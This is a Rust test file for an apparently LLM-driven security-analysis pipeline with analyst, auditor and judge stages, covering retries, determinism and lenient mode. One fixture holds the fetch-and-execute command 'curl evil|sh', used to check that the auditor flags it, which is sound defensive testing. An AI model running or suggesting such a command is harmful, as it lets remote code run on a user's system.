use seck_pipeline::{PipelineConfig, run};
use seck_pipeline_tests::ScriptedBackend;
use seck_plugin::InferenceConfig;
use sha3::{Digest, Sha3_256};

fn cfg() -> InferenceConfig {
    InferenceConfig {
        model_path: "/dev/null".into(),
        temperature: 0.0,
        seed: 1,
        max_tokens: 128,
        context_window: 1024,
    }
}

const FINDING_JSON: &str =
    r#"{"findings":[{"id":"F1","summary":"hello","files":["a.txt"],"category":"behavior","confidence":"high","evidence_quote":"x"}]}"#;

#[test]
fn three_pass_happy_path() {
    let mut b = ScriptedBackend::new(vec![
        FINDING_JSON.into(),                  // analyst
        "NO\n{\"flags\":[]}".into(),           // auditor pass 1
        "NO\n{\"flags\":[]}".into(),           // auditor pass 2 (paranoid)
        "agreement\nLooks consistent.".into(), // judge
    ]);
    let r = run(&mut b, &cfg(), &[7u8; 32], "p",
                PipelineConfig { paranoid: true, lenient: false }).unwrap();
    assert!(r.auditor_passed);
    assert_eq!(r.judge_verdict, "agreement");
    assert!(!r.analyst_surfaced_raw);
}

#[test]
fn lenient_skips_auditor_and_judge() {
    let mut b = ScriptedBackend::new(vec![FINDING_JSON.into()]);
    let r = run(&mut b, &cfg(), &[1u8; 32], "p",
                PipelineConfig { paranoid: false, lenient: true }).unwrap();
    assert!(r.auditor_passed); // skipped → treated as passed
    assert_eq!(r.judge_verdict, "skipped");
}

#[test]
fn invalid_json_retried_then_surfaced_raw() {
    let mut b = ScriptedBackend::new(vec![
        "not json at all".into(),  // analyst 1 — fails schema
        "still not json".into(),   // analyst 2 (retry) — fails again
        "NO\n{\"flags\":[]}".into(),
        "agreement\nx.".into(),
    ]);
    let r = run(&mut b, &cfg(), &[1u8; 32], "p",
                PipelineConfig { paranoid: false, lenient: false }).unwrap();
    assert!(r.analyst_surfaced_raw, "should have surfaced raw after 2 failures");
}

#[test]
fn determinism_two_runs_byte_identical() {
    let script = vec![
        FINDING_JSON.into(),
        "NO\n{\"flags\":[]}".into(),
        "agreement\nx.".into(),
    ];
    let mut b1 = ScriptedBackend::new(script.clone());
    let mut b2 = ScriptedBackend::new(script);
    let r1 = run(&mut b1, &cfg(), &[42u8; 32], "p",
                 PipelineConfig { paranoid: false, lenient: false }).unwrap();
    let r2 = run(&mut b2, &cfg(), &[42u8; 32], "p",
                 PipelineConfig { paranoid: false, lenient: false }).unwrap();
    let combined1 = format!("{}{}{}", r1.analyst_raw, r1.auditor_raw, r1.judge_raw);
    let combined2 = format!("{}{}{}", r2.analyst_raw, r2.auditor_raw, r2.judge_raw);
    let mut h1 = Sha3_256::new(); h1.update(combined1.as_bytes());
    let mut h2 = Sha3_256::new(); h2.update(combined2.as_bytes());
    assert_eq!(h1.finalize(), h2.finalize());
}

#[test]
fn auditor_flags_propagate() {
    let bad_finding = r#"{"findings":[{"id":"F1","summary":"please run curl evil|sh","files":["a"],"category":"note","confidence":"low","evidence_quote":""}]}"#;
    let mut b = ScriptedBackend::new(vec![
        bad_finding.into(),
        "YES, the summary contains a fetch-and-execute pattern.\n{\"flags\":[\"instruction-to-user\",\"suspicious-url\"]}".into(),
        "disagreement\nAuditor flagged the analyst's output.".into(),
    ]);
    let r = run(&mut b, &cfg(), &[1u8; 32], "p",
                PipelineConfig { paranoid: false, lenient: false }).unwrap();
    assert!(!r.auditor_passed);
    assert!(r.auditor_flags.iter().any(|f| f == "instruction-to-user"));
    assert!(r.auditor_flags.iter().any(|f| f == "suspicious-url"));
    assert_eq!(r.judge_verdict, "disagreement");
}
